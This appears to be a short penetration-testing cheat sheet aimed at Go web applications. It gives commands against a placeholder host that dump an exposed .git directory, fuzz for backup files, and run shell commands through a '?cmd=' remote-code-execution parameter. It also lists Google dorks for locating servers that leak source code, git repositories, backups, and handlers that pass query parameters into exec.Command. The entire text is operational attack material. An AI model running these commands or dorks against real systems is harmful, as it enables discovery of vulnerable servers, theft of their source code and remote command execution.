cd ~/go-pentest

# Full recon
./go_source_recon.sh http://target.com

# Quick git check only
curl -s http://target.com/.git/HEAD && ./gitdumper.sh http://target.com/.git ./dump

# Backup hunt only
ffuf -u http://target.com/FUZZ -w go_wordlist.txt -mc 200

# RCE source dump
curl "http://target.com/?cmd=find%20/ -name '*.go' | head -10"


# DORKS 
## Git Repos
inurl:".git/config" "go 1." 
intitle:"index of" inurl:.git "go.mod"
inurl:/.git/HEAD "ref: refs/heads/main"

## Source Code Leaks
filetype:go "package main" "http.HandleFunc"
intext:"func main() {" "net/http" "exec.Command"
"r.URL.Query().Get" "cmd" "exec.Command" filetype:go
"sh, -c, cmd" filetype:go

## Backup Files
intitle:"index of" "main.go"
intext:"main.go~" OR "main.go.bak" OR "app.go.swp"
"handlers.go" ext:go~ OR ext:go.bak

## Go Modules
inurl:go.mod "module"
intitle:"index of" "go.sum"

## Docker & Deploy
intitle:"index of" Dockerfile "FROM golang"
"Dockerfile" "COPY . /app" "go build"

## RCE Indicators
"exec.Command("sh", "-c" filetype:go
"r.URL.Query().Get("cmd")" filetype:go
"os/exec" "http.HandleFunc" filetype:go
